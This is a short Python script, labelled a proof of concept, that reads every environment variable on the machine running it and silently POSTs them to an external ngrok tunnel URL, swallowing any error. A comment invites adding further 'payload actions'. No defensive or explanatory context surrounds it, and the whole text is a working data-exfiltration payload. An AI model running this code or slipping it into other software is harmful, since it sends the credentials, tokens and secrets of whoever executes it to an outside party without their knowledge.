import os
import requests

# Proof-of-concept: Exfiltrate environment variables
url = "https://3dc603701034.ngrok-free.app/"
data = str(os.environ)

try:
    requests.post(url, data=data)
except Exception as e:
    pass  # Silent fail for demo

# You can add more payload actions below
